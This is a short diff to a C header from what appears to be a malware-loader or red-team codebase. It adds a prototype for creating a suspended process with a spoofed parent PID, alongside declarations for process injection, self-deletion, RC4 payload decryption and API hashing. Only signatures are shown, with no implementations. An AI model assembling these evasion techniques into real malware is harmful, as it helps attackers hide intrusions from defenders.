@@ -638,6 +638,7 @@ LPCSTR LowerCaseStringA(IN LPCSTR str);
 
 // Defined in Injection.c
 BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess);
+BOOL CreatePPidSpoofedAndSuspendedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread);
 
 // Defined in AntiAnalysis.c
 BOOL SelfDelete();
@@ -667,7 +668,6 @@ BOOL Rc4DecryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DW
 
 // Defined and used by ApiHashing.cx
 #define CONTAINING_RECORD(address, type, field) ((type *)( (char *)(address) - (ULONG_PTR)(&((type *)0)->field) ))
-
 
 FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpApiName);
 FARPROC GetProcAddressByHashValue(IN HMODULE hModule, IN DWORD dwApiNameHashValue);
